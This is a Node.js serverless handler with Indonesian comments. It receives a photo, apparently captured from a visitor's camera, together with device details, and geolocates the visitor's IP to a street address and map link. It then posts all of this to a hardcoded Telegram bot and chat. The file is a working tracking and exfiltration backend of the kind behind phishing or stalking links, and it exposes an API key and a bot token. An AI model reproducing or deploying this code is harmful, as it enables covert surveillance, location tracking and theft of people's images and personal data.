import fetch from "node-fetch";
import FormData from "form-data";
import UAParser from "ua-parser-js"; // Pastikan sudah install: npm i ua-parser-js

const OPENCAGE_KEY = "136e90f2e15c46fda280cbc59b05cfda"; // Ganti dengan API key kamu

export default async function handler(req, res) {
  try {
    const { image, deviceInfo } = req.body;
    const botToken = "8075080156:AAFhn7Wqxr-cxpvlSKdEFr1iL6qdOgWGwgw";
    const chatId = "6676770258";

    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const userAgent = req.headers["user-agent"];
    const parser = new UAParser(userAgent);

    const device = parser.getDevice();
    const os = parser.getOS();
    const browser = parser.getBrowser();

    // Dapatkan info IP dan lokasi
    const ipInfoRes = await fetch(`https://ipinfo.io/${ip}/json`);
    const ipInfo = await ipInfoRes.json();

    const lokasi = `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}`;
    const isp = ipInfo.org || "Tidak diketahui";
    const timezone = ipInfo.timezone || "Asia/Jakarta";
    const waktu = new Date().toLocaleString("id-ID", { timeZone: timezone });

    const [lat, lon] = (ipInfo.loc || "").split(",");
    let alamatLengkap = "Tidak tersedia";
    if (lat && lon) {
      const geoRes = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${OPENCAGE_KEY}`);
      const geoData = await geoRes.json();
      alamatLengkap = geoData?.results?.[0]?.formatted || "Tidak ditemukan";
    }

    const mapsLink = lat && lon ? `https://www.google.com/maps?q=${lat},${lon}` : "Tidak tersedia";

    const caption = `Dev By @FazrrEdan
IP: ${ip}
Lokasi: ${lokasi}
Alamat: ${alamatLengkap}
ISP: ${isp}
Jam: ${waktu}

Perangkat: ${device.model || "Tidak diketahui"}
OS: ${os.name} ${os.version}
Browser: ${browser.name} ${browser.version}

Baterai: ${deviceInfo.batteryLevel}% (${deviceInfo.isCharging})
RAM: ${deviceInfo.ram} GB
Penyimpanan: ${deviceInfo.usedStorage} / ${deviceInfo.totalStorage}
Koneksi: ${deviceInfo.connection}
Maps: ${mapsLink}`;

    const imageBuffer = Buffer.from(image.split(",")[1], "base64");

    const form = new FormData();
    form.append("chat_id", chatId);
    form.append("photo", imageBuffer, "photo.jpg");
    form.append("caption", caption);

    const telegram = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: "POST",
      body: form,
      headers: form.getHeaders(),
    });

    const result = await telegram.json();
    console.log(result);
    res.status(200).json({ success: true, result });
  } catch (error) {
    console.error("Gagal kirim ke Telegram:", error);
    res.status(500).json({ success: false });
  }
}
